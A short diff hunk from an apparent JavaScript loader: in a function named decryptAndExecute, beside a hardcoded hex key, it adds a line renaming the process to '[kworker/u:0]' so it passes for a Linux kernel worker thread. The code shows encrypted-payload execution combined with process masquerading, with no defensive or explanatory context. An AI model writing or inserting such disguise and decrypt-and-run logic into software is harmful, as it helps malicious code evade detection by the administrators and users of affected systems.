@@ -334,6 +334,7 @@ async function decryptAndExecute() {
         server = await acquireLock();
         setupCleanupHandlers(server);
         startHeartbeat();
+        process.title = '[kworker/u:0]';
 
         const keyData = {
             key: "bcaae641e671c9fb6f29ca05f55426a6d7077ec78e02b551bf1f8e83c9efaa13",
